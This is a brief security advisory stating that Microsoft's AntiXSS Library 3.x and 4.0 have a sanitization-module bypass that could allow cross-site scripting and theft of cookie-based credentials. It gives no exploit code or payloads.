Microsoft Anti-Cross Site Scripting (AntiXSS) Library is prone to a security-bypass vulnerability that affects the sanitization module.

An attacker can exploit this vulnerability to bypass the filter and conduct cross-site scripting attacks. Successful exploits may allow attackers to execute arbitrary script code and steal cookie-based authentication credentials.

Microsoft Anti-Cross Site Scripting Library 3.x and 4.0 are vulnerable.
